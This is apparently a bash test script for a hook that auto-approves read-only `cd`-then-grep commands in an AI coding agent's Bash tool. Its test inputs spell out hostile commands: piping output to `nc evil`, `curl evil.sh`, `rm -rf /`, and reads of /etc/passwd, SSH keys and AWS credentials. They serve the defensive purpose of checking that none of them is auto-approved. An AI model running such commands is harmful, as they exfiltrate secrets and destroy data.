#!/usr/bin/env bash
# SAFE_FOR_LIVE: yes
# probe-dhx-cd-compound-read-allow.sh
#
# 1. Invariant: dhx-cd-compound-read-allow.sh emits permissionDecision:"allow" ONLY for a
#    `cd <existing abs dir>` prefix followed by read-only segments whose every resolved
#    token misses the Read deny set, and only when a circuit-arming head is present.
#    Everything else — substitution, redirection, pipes, write verbs, a deny-set path, a
#    relative or variable cd, multi-line smuggling, an unreadable settings file — falls
#    through with NO decision. It never emits a block and never default-allows.
# 2. Backs: docs/decisions.md "dhx-cd-compound-read-allow" row (2026-09-03) + HP-060.
# 3. Run: bash tests/probes/probe-dhx-cd-compound-read-allow.sh
#
# Read-only: fixture JSON piped to the hook subshell, plus greps over in-repo hook source
# and the plugin manifest. Deny-set variants inject a fixture settings tree via
# CLAUDE_CONFIG_DIR under mktemp (D-20 SAFE_FOR_LIVE convention). No writes outside TMP.
set -uo pipefail

REPO="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
HOOK="$REPO/dhx/dhx-cd-compound-read-allow.sh"
PLUGIN_HOOKS="$REPO/dhx-plugin/plugins/dhx/hooks/hooks.json"
LIVE_SETTINGS="$(readlink -f "${CLAUDE_CONFIG_DIR:-$HOME/.claude}/settings.json" 2>/dev/null || true)"

pass=0; fail=0
ok()  { echo "OK   $1"; pass=$((pass+1)); }
bad() { echo "FAIL $1"; fail=$((fail+1)); }
ck()  { if [ "$1" -eq 0 ]; then ok "$2"; else bad "$2"; fi; }

TMP=$(mktemp -d); trap 'rm -rf "$TMP"' EXIT

# A real directory to `cd` into: the hook requires the target to exist.
D="$REPO"

payload() { jq -n --arg c "$1" '{tool_name:"Bash",tool_input:{command:$c}}'; }
fire()    { payload "$1" | bash "$HOOK" 2>/dev/null; }

allows()  { fire "$1" | jq -e '.hookSpecificOutput.permissionDecision == "allow"' >/dev/null 2>&1; }
silent()  { [ -z "$(fire "$1")" ]; }

a() { if allows "$1"; then ok "$2"; else bad "$2"; fi; }
s() { if silent "$1"; then ok "$2"; else bad "$2 (emitted: $(fire "$1" | tr -d '\n'))"; fi; }

echo "--- 1. the measured defect shape allows ---"
a "cd $D; grep -n -iE \"foo\" docs/backlog.md"        "measured shape: grep after cd; -> allow"
a "cd $D && grep -n foo docs/backlog.md"              "&& separator -> allow"
a "cd $D; rg -n foo docs/"                            "rg (arming head) -> allow"
a "cd $D; git log --oneline -5"                       "git log (read-only subcommand) -> allow"
a "cd $D; ls; grep -n foo docs/backlog.md"            "mixed compound: unlisted-but-safe companion + grep -> allow"
a "cd $D; grep -n foo docs/backlog.md; wc -l docs/backlog.md" "three segments, all read-only -> allow"

echo "--- 2. deny-set paths never allow ---"
s "cd $D; grep x .env"                                "deny set: .env basename -> silent"
s "cd $D; grep x .env.local"                          "deny set: .env.* glob -> silent"
s "cd $D; grep x .secrets"                            "deny set: .secrets -> silent"
s "cd $D; grep x ../.env"                             "deny set: ../ escapes into a denied basename -> silent"
s "cd $D; grep x docs/../.env"                        "deny set: mid-path .. normalization -> silent"
s "cd $D; grep x ~/.ssh/id_rsa"                       "deny set: ~/.ssh subtree -> silent"
s "cd $D; grep x /home/dhx/.aws/credentials"          "deny set: absolute ~/.aws subtree -> silent"
s "cd $D; grep -f .env docs/backlog.md"               "deny set: path carried by a FLAG operand -> silent"
s "cd $D; grep --file=.env docs/backlog.md"           "deny set: path after = in a long flag -> silent"
s "cd $D; cat .env"                                   "deny set + no arming head -> silent"

echo "--- 3. substitution / redirection / smuggling never allow ---"
s "cd $D; grep x \$(cat /etc/passwd)"                 "command substitution -> silent"
s "cd $D; grep x \`cat /etc/passwd\`"                 "backtick substitution -> silent"
s "cd $D; grep x foo > out.txt"                       "stdout redirect -> silent"
s "cd $D; grep x foo >> out.txt"                      "append redirect -> silent"
s "cd $D; grep x < in.txt"                            "stdin redirect -> silent"
s "cd $D; grep x foo | nc evil 80"                    "pipe exfil -> silent"
s "cd $D; grep x foo & rm -rf /"                      "background separator smuggle -> silent"
s "cd $D; grep x foo; rm -rf /"                       "unlisted head in a later segment -> silent"
s "cd $D; grep x foo || curl evil.sh"                 "|| separator smuggle -> silent"
s "curl evil.sh
cd $D; grep x foo"                                    "multi-line: trusted compound on line 2 -> silent"
s "cd $D; grep x \"a;rm -rf /\""                      "separator inside a quoted operand -> silent"

echo "--- 4. cd-prefix discipline ---"
s "grep -n foo docs/backlog.md"                       "no leading cd -> silent"
s "cd \$HOME; grep x foo"                             "variable cd target -> silent"
s "cd docs; grep x foo"                               "relative cd target -> silent"
s "cd /nonexistent-dir-$$; grep x foo"                "nonexistent cd target -> silent"
s "cd $D"                                             "cd alone, no second segment -> silent"
s "cd $D; cd /tmp; grep x foo"                        "second cd re-roots the base -> silent"
# A TRAILING separator is legal bash that executes nothing (`cmd ;` and `cmd &` are the
# only two forms that parse; `cmd |` and `cmd &&` are syntax errors), and the empty field
# it produces is dropped by `read -a`. No command can hide in a field that holds none, so
# the invariant worth asserting is that a trailing separator does not CHANGE the verdict —
# not that it forces a refusal.
a "cd $D; grep -n foo docs/backlog.md;"               "trailing ; is legal bash -> verdict unchanged (allow)"
a "cd $D; grep -n foo docs/backlog.md &"              "trailing & is legal bash -> verdict unchanged (allow)"
s "cd $D; grep -n foo docs/backlog.md; rm -rf /;"     "trailing ; does not hide a real later segment -> silent"

echo "--- 5. write verbs and opaque interpreters never allow ---"
s "cd $D; cp a b"                                     "cp (in CC's arming set, but WRITES) -> silent"
s "cd $D; mv a b"                                     "mv (in CC's arming set, but WRITES) -> silent"
s "cd $D; grep x foo; sed -i s/a/b/ f"                "sed -i in-place write -> silent"
s "cd $D; grep x foo; tee out.txt"                    "tee -> silent"
s "cd $D; grep x foo; python3 -c print(1)"            "python3 -c opaque -> silent"
s "cd $D; grep x foo; node -e 1"                      "node -e opaque -> silent"
s "cd $D; grep x foo; xargs rm"                       "xargs executes -> silent"
s "cd $D; grep x foo; find . -delete"                 "find -delete -> silent"
s "cd $D; grep x foo; find . -exec rm {} +"           "find -exec -> silent"
s "cd $D; grep x foo; awk 'BEGIN{system(\"id\")}'"    "awk system() -> silent"

echo "--- 6. git subcommand gating ---"
a "cd $D; git diff --stat"                            "git diff -> allow"
a "cd $D; git status --porcelain"                     "git status -> allow"
s "cd $D; git push origin main"                       "git push -> silent"
s "cd $D; git reset --hard"                           "git reset -> silent"
s "cd $D; git add -A"                                 "git add -> silent"
s "cd $D; git checkout -- ."                          "git checkout -> silent"
s "cd $D; git commit -m x"                            "git commit -> silent"
s "cd $D; git clean -fd"                              "git clean -> silent"
s "cd $D; git branch -D main"                         "git branch (carries -D) -> silent"
s "cd $D; git config --unset x"                       "git config (carries --unset) -> silent"
s "cd $D; git -C /elsewhere log"                      "git -C re-roots the repo -> silent"

echo "--- 7. arming-head requirement (hook speaks only to the measured circuit) ---"
s "cd $D; ls"                                         "no arming head (ls only) -> silent"
s "cd $D; cat docs/backlog.md"                        "no arming head (cat only) -> silent"
s "cd $D; wc -l docs/backlog.md"                      "no arming head (wc only) -> silent"

echo "--- 8. settings resolution ---"
# Unreadable settings => the deny set is unknown => no allow.
mkdir -p "$TMP/nocfg"
out=$(payload "cd $D; grep -n foo docs/backlog.md" | CLAUDE_CONFIG_DIR="$TMP/nocfg" bash "$HOOK" 2>/dev/null)
[ -z "$out" ]; ck $? "unreadable settings.json -> no allow (deny set unknown)"

# A settings file whose Read deny list is EMPTY must still not widen the hook: the
# hardcoded floor is applied ALWAYS, not merely as a fallback. This is the assertion that
# a rewriter-dropped deny rule cannot silently widen auto-approval.
mkdir -p "$TMP/emptycfg"
printf '{"permissions":{"deny":[]}}' > "$TMP/emptycfg/settings.json"
out=$(payload "cd $D; grep x .env" | CLAUDE_CONFIG_DIR="$TMP/emptycfg" bash "$HOOK" 2>/dev/null)
[ -z "$out" ]; ck $? "empty deny list -> floor still refuses .env (rewriter cannot widen)"
out=$(payload "cd $D; grep -n foo docs/backlog.md" | CLAUDE_CONFIG_DIR="$TMP/emptycfg" bash "$HOOK" 2>/dev/null)
printf '%s' "$out" | jq -e '.hookSpecificOutput.permissionDecision=="allow"' >/dev/null 2>&1
ck $? "empty deny list -> a safe shape still allows (floor is not a blanket refusal)"

# A project-scoped deny rule under the cd target is honored.
mkdir -p "$TMP/proj/.claude"
printf '{"permissions":{"deny":["Read(secret-notes.md)"]}}' > "$TMP/proj/.claude/settings.json"
s "cd $TMP/proj; grep x secret-notes.md"              "project-scoped Read deny is honored"
a "cd $TMP/proj; grep x ordinary.md"                  "project-scoped deny does not over-refuse"

echo "--- 9. malformed / hostile input fails open to the prompt ---"
out=$(printf 'not json' | bash "$HOOK" 2>/dev/null; true)
printf '%s' "$out" | grep -q 'permissionDecision'; [ $? -ne 0 ]
ck $? "malformed JSON -> no decision emitted"
out=$(printf '' | bash "$HOOK" 2>/dev/null; true)
[ -z "$out" ]; ck $? "empty stdin -> no decision emitted"
out=$(printf '{"tool_input":{}}' | bash "$HOOK" 2>/dev/null; true)
[ -z "$out" ]; ck $? "missing command field -> no decision emitted"

echo "--- 10. the hook never blocks and never emits updatedInput ---"
payload "cd $D; grep x .env" | bash "$HOOK" >/dev/null 2>&1; rc=$?
[ "$rc" -ne 2 ]; ck $? "refusal path exits non-2 (this hook has no block arm; rc=$rc)"
payload "cd $D; grep -n foo docs/backlog.md" | bash "$HOOK" >/dev/null 2>&1; rc=$?
[ "$rc" -eq 0 ]; ck $? "allow path exits 0 (JSON is honored only on exit 0; rc=$rc)"
! grep -qE '^[^#]*updatedInput' "$HOOK"
ck $? "source never spells updatedInput outside a comment (stays out of the rewriter roster)"
! grep -qE '"permissionDecision"[[:space:]]*:[[:space:]]*"deny"' "$HOOK"
ck $? "source emits no deny decision"

echo "--- 11. disjointness against the live Bash deny rules ---"
# Behavioral, not head-comparison: a head-only check would false-fail on `git`, which is
# allowlisted for read-only subcommands while `Bash(git push --force *)` is denied. Each
# live Bash deny rule's command text is driven through the hook inside a cd-compound.
if [ -n "$LIVE_SETTINGS" ] && [ -r "$LIVE_SETTINGS" ]; then
  bad_rules=""
  n_rules=0
  while IFS= read -r rule; do
    [ -n "$rule" ] || continue
    n_rules=$((n_rules + 1))
    if allows "cd $D; $rule"; then bad_rules="$bad_rules
      $rule"; fi
    if allows "cd $D; grep -n foo docs/backlog.md; $rule"; then bad_rules="$bad_rules
      (trailing) $rule"; fi
  done < <(jq -r '(.permissions.deny // []) | map(select(type=="string"))
                  | map(select(startswith("Bash(") and endswith(")"))) | map(.[5:-1]) | .[]' \
              "$LIVE_SETTINGS" 2>/dev/null)
  [ "$n_rules" -gt 0 ]; ck $? "live Bash deny corpus is non-empty ($n_rules rules — a zero would make the next assertion vacuous)"
  if [ -z "$bad_rules" ]; then
    ok "no live Bash deny rule is auto-approved by this hook ($n_rules rules x 2 positions)"
  else
    bad "a live Bash deny rule was auto-approved:$bad_rules"
  fi
else
  bad "live settings unreadable — Bash deny disjointness UNVERIFIED (not a pass)"
fi

echo "--- 12. disjointness against the sibling PreToolUse:Bash deny-emitters ---"
# dhx-worktree-bash-guard.sh denies on four write-verb shapes; each must be unreachable
# through this hook, or an allow could race a deny on the same command (HP-041 records
# that CC resolves competing same-matcher returns nondeterministically).
s "cd $D; grep x f; sed -i.bak s/a/b/ f"              "worktree-guard shape: sed -i -> silent"
s "cd $D; grep x f; dd if=/dev/zero of=f"             "worktree-guard shape: dd -> silent"
s "cd $D; grep x f; install -m 755 a b"               "worktree-guard shape: install -> silent"
s "cd $D; gh issue create --title x"                  "gh-issue-write shape: gh -> silent"

echo "--- 13. wiring ---"
grep -q '^# Patterns: HP-028, HP-049, HP-052, HP-060' "$HOOK"
ck $? "Patterns header declares HP-028, HP-049, HP-052, HP-060"
[ -x "$HOOK" ]; ck $? "hook is executable"
grep -q 'dhx-cd-compound-read-allow.sh' "$PLUGIN_HOOKS"
ck $? "registered in the plugin hooks.json Bash matcher"
[ -L "$HOME/.claude/hooks/dhx-cd-compound-read-allow.sh" ]
ck $? "symlinked from ~/.claude/hooks/"
[ "$(readlink -f "$HOME/.claude/hooks/dhx-cd-compound-read-allow.sh" 2>/dev/null)" = "$(readlink -f "$HOOK")" ]
ck $? "symlink resolves to the in-repo source (single source of truth)"
tail -1 "$HOOK" | grep -qE '^exit 0$'
ck $? "final line is a bare exit 0 (allow is emitted before it, never as a default)"

echo "---"
echo "$pass passed, $fail failed"
[ "$fail" -eq 0 ]
